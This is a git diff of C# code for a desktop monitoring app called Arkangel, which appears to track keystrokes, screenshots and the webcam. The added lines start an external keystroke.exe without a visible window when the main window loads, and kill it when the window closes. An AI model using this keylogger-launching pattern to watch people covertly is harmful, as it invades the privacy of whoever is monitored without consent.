@@ -7,6 +7,7 @@ using System.Diagnostics;
 
 using System.Timers;
 using System.Data.SQLite;
+using System.IO;
 
 namespace Arkangel
 {
@@ -33,6 +34,8 @@ namespace Arkangel
         private const uint VK_CAPITAL = 0x14;
         //Screenshot
         public static System.Timers.Timer aTimer_scrshot;
+
+        private Process myProcess = new Process();
         public static void SetTimer(int _time)
         {
             // Create a timer with a two second interval.
@@ -66,19 +69,26 @@ namespace Arkangel
             }
 
 
-//Closing += new System.ComponentModel.CancelEventHandler(MainWindow_Closing);
+            //Closing += new System.ComponentModel.CancelEventHandler(MainWindow_Closing);
 
             //Keystroke
             //try
             //{
-            //    myProcess.StartInfo.UseShellExecute = true;
-            //    myProcess.StartInfo.FileName =@"..\..\Module\keystroke.exe";
-            //    myProcess.StartInfo.CreateNoWindow = true;
-            //    myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            //    myProcess.Start();
+            //myProcess.StartInfo.UseShellExecute = false;
+            //myProcess.StartInfo.FileName = @"..\..\module\keystroke.exe";
+            //myProcess.StartInfo.CreateNoWindow = false;
+            //// myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            //myProcess.Start();
             //}
             //catch { };
             //Screenshot
+            //ProcessStartInfo start = new ProcessStartInfo();
+            //start.FileName = "keystroke.exe";
+            //start.WorkingDirectory = @"..\..\module";
+            //start.WindowStyle = ProcessWindowStyle.Hidden;
+            //Process.Start(start);
+
+           
 
             int _hours=0,_minutes=0,enable=0;
             using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
@@ -178,15 +188,17 @@ namespace Arkangel
                 //    process.Kill();
                 //}
                
-                try
-                {
-                    myProcess.Kill();
-                    myProcess.Dispose();
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine(ex.ToString());
-                }
+                //try
+                //{
+                    
+                //    myProcess.Kill();
+                //    myProcess.Close();
+                //    myProcess.Dispose();
+                //}
+                //catch (Exception ex)
+                //{
+                //    Console.WriteLine(ex.ToString());
+                //}
                 LoginForm loginForm = new LoginForm();
                 loginForm.Show();
                 Close();
@@ -199,21 +211,21 @@ namespace Arkangel
             Hide();
         }
 
-        private Process myProcess = new Process();
+
 
         //private void Grid_Loaded(object sender, RoutedEventArgs e)
         //{
-        //    //try
-        //    //{
-        //    //    myProcess.StartInfo.UseShellExecute = true;
-        //    //    myProcess.StartInfo.FileName = "..\\..\\Module_py\\webcam.py";
-        //    //    myProcess.StartInfo.CreateNoWindow = true;
-        //    //    myProcess.Start();
-        //    //}
-        //    //catch (Exception ex)
-        //    //{
-        //    //    Console.WriteLine("MESSAGE: " + ex.Message);
-        //    //}
+        //    try
+        //    {
+        //        myProcess.StartInfo.UseShellExecute = true;
+        //        myProcess.StartInfo.FileName = "..\\..\\module\\keystroke.exe";
+        //        myProcess.StartInfo.CreateNoWindow = true;
+        //        myProcess.Start();
+        //    }
+        //    catch (Exception ex)
+        //    {
+        //        Console.WriteLine("MESSAGE: " + ex.Message);
+        //    }
         //}
         //private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
         //{
@@ -309,6 +321,31 @@ namespace Arkangel
             DragMove();
         }
 
+        private void Window_Loaded(object sender, RoutedEventArgs e)
+        {
+            try
+            {
+                myProcess.StartInfo.UseShellExecute = true;
+                myProcess.StartInfo.WorkingDirectory = @"..\\..\\module";
+                myProcess.StartInfo.FileName = @"keystroke.exe";
+                myProcess.StartInfo.CreateNoWindow = true;
+                myProcess.Start();
+                Console.WriteLine(myProcess.StandardOutput);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("MESSAGE: " + ex.Message);
+            }
+        }
+
+        private void Window_Closed(object sender, EventArgs e)
+        {
+            foreach (var process in Process.GetProcessesByName("keystroke"))
+            {
+                process.Kill();
+            }
+
+        }
     }
 }
 
